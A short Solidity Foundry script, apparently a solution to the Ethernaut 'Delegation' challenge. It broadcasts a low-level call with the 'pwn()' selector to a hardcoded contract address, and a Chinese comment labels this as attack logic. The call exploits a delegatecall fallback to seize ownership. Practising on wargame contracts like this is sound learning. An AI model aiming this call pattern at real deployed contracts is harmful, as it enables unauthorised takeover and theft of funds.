pragma solidity ^0.8.0;
import "forge-std/Script.sol";

interface IDelegation {
    
}

contract ToeknScript is Script {
    function run() external {
        
        vm.startBroadcast();
        
        // 在这里编写你的攻击逻辑，例如调用目标合约的函数
        IDelegation delegation = IDelegation(0x69F8C347a4ed5E4a76AF91f0dEb318a3Ea9CEe28);
       (bool success,) =address(delegation).call(abi.encodeWithSignature("pwn()"));
        require(success, "Attack failed");
        vm.stopBroadcast();
    }
}